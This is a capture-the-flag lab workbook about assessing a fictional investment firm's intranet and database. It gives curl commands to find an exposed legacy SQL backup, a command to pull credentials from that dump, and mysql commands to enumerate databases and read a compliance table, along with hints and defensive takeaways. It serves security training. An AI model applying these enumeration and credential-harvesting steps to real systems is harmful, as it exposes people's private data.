# Meridian Financial: Data Breach Assessment

!!! note "Workbook generated from the lab definition"
    This walkthrough was generated from `linux-9-1-meridian-data-breach-assessment/lab.yaml` and reviewed for
    structure. Verify the target name, commands, and output against the running
    lab before relying on them. Do not copy a flag from the lab definition; use
    the flag you recover in the environment.

## Before You Begin

- [ ] Launched **Meridian Financial: Data Breach Assessment** in the platform
- [ ] Opened the lab browser or terminal
- [ ] You can reach the target shown in the exercise
- [ ] Estimated time: **60 minutes** · Difficulty: **intermediate**

## Targets and Tools

- Use the target address shown in the exercise.

- No special tool list is declared; use the terminal or browser provided by the lab.

## Scenario

Meridian Financial Group, a mid-size investment advisory firm headquartered in
Raleigh, North Carolina, has engaged your team at Ironwood Security Consulting
for a data protection assessment. The engagement was triggered by an internal
audit that flagged "potential data exposure", but the scope and severity are
unknown.

Your point of contact, James Park (IT Director), explains: "We migrated our
internal systems last quarter and stood up a new employee intranet. The
development team assures me everything is locked down, but our compliance
officer noticed some anomalies in the access logs. I need your team to
investigate the intranet and our backend database to determine if any
sensitive data was exposed during the migration."

James shares that the intranet runs on one server and the company database
runs on a separate host. He believes the database is only accessible to
authenticated application users. Your task is to assess both systems,
identify any data protection failures, and document your findings.

**Credentials**

- Database Access: `meridian_app` / `M3r1d14n_App_2024#`

## Your Objectives

- Enumerate the corporate intranet to discover all available pages and directories
- Identify exposed backup files containing sensitive data
- Extract database credentials from backup artifacts
- Connect to the backend database and enumerate schemas and tables
- Locate the compliance finding that documents the data breach
- Capture the flag

## Background and Approach

Read the scenario before touching the target. Identify what you control, where
that input goes, and what evidence would prove success. Work from discovery to
verification: confirm the service, collect the minimum evidence, then capture
the flag. Use the lab's target list rather than guessing an address.

## Walkthrough

1. Launch the exercise and note the target address shown by the platform.
2. Confirm the target is reachable with a simple check before running a larger
   scan or exploit.
3. Work through the objectives in order. Record the exact command and the
   relevant output for each step.
4. If a step stalls, use the hint ladder below rather than jumping to a later
   hint.
5. When you recover the flag, submit it in the **Submit Flag** form and record
   the result.

### Reference commands

These are the lab's verification commands, with the target replaced by
`<target>`. They are a check, not a substitute for understanding the objective.

**Intranet web server responds**

```bash
curl -s -o /dev/null -w '%{http_code}' http://<target>/
```

Expected: `200`

**Staff directory page exists**

```bash
curl -s http://<target>/staff/
```

Expected: `James Park`

**IT notices page exists**

```bash
curl -s http://<target>/notices/
```

Expected: `backup migration`

**Backups root is access-restricted**

```bash
curl -s -o /dev/null -w '%{http_code}' http://<target>/backups/
```

Expected: `403`

**Legacy backup directory is accessible**

```bash
curl -s http://<target>/backups/legacy/
```

Expected: `meridian_dump.sql`

**SQL dump contains database credentials**

```bash
curl -s http://<target>/backups/legacy/meridian_dump.sql | grep -o "M3r1d14n_App_2024#"
```

Expected: `M3r1d14n_App_2024#`

**MySQL is accessible with dump credentials**

```bash
mysql -h <target> -u {cred.dbuser.user} -p'{cred.dbuser.pass}' -N -e 'SHOW DATABASES' 2>&1
```

Expected: `meridian_compliance`

**HR and finance databases are permission-denied**

```bash
mysql -h <target> -u {cred.dbuser.user} -p'{cred.dbuser.pass}' -N -e 'SELECT * FROM meridian_hr.employees LIMIT 1' 2>&1
```

Expected: `denied`

**Data classifications table exists in compliance database**

```bash
mysql -h <target> -u {cred.dbuser.user} -p'{cred.dbuser.pass}' meridian_compliance -N -e 'SELECT classification, record_name FROM data_classifications WHERE classification="PII"' 2>&1
```

Expected: `PII`

**Flag is in compliance_findings table**

```bash
mysql -h <target> -u {cred.dbuser.user} -p'{cred.dbuser.pass}' meridian_compliance -N -e 'SELECT finding_detail FROM compliance_findings WHERE severity="CRITICAL"' 2>&1
```

Expected: `OCR{`


### Hint ladder

<details><summary>Hint 1 (unlocks after 10 minutes)</summary>

The intranet has more than what's visible on the homepage. Web applications
often have directories for internal resources, documentation, and backups.
Use directory enumeration techniques to discover hidden paths on the web
server.

</details>

<details><summary>Hint 2 (unlocks after 18 minutes)</summary>

Look for backup directories on the web server. The path /backups/ is
restricted, but legacy backup paths may still be accessible. Try common
variations like /backups/legacy/, /backups/old/, or /backups/archive/.
The SQL dump file inside contains database credentials.

</details>

<details><summary>Hint 3 (unlocks after 25 minutes)</summary>

The file at http://<target_ip>/backups/legacy/meridian_dump.sql contains
the credentials: meridian_app / M3r1d14n_App_2024#. Connect to the
database server on port 3306:
mysql -h <db_ip> -u meridian_app -p'M3r1d14n_App_2024#'
Then enumerate databases with SHOW DATABASES, explore tables with
SHOW TABLES, and look for compliance-related tables.

</details>


## Record Your Findings

| Item | Your result |
|---|---|
| Target address |  |
| Service or path discovered |  |
| Evidence that proves the objective |  |
| Flag recovered |  |
| What you would change defensively |  |

## Analysis Questions

1. What did you control, and where did that input reach?
2. Which check was missing or weak?
3. What evidence proves the objective was met, rather than only attempted?
4. What would a defender see in logs or monitoring?
5. What is the smallest fix that would stop the same path?

## Defensive Takeaway

Disable unused services, enforce key-based SSH with least privilege, and alert on unexpected authentication or command execution.

## If You Get Stuck

If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty.

Separate a platform problem from a learning problem:

- **Target unreachable:** check the lab status and the target address first.
- **Command error:** read the exact error; check the port, path, and credentials.
- **Technique fails:** compare your command with the reference command and the
  hint ladder.
- **Persistent failure:** report it to the instructor with the command and error.

## Key Takeaways

- You practised the objective in an isolated, fictional environment.
- The flag is evidence of completion, not a grade.
- The defensive takeaway matters as much as the offensive step.
- Keep the exact evidence so another analyst can reproduce the result.
